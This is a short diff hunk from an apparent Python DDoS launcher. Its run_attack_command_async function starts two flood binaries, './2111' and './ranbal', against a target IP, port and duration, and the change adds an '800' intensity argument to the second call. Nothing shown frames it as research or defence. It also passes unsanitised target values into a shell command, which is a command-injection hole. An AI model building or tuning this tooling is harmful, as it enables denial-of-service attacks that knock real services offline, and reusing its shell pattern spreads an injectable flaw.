@@ -71,7 +71,7 @@ async def run_attack_command_async(target_ip, target_port, duration):
     try:
         # Create both subprocesses and await their execution
         process_2111 = await asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
-        process_ranbal = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration}")
+        process_ranbal = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration} 800")
 
         # Wait for both processes to complete
         await asyncio.gather(
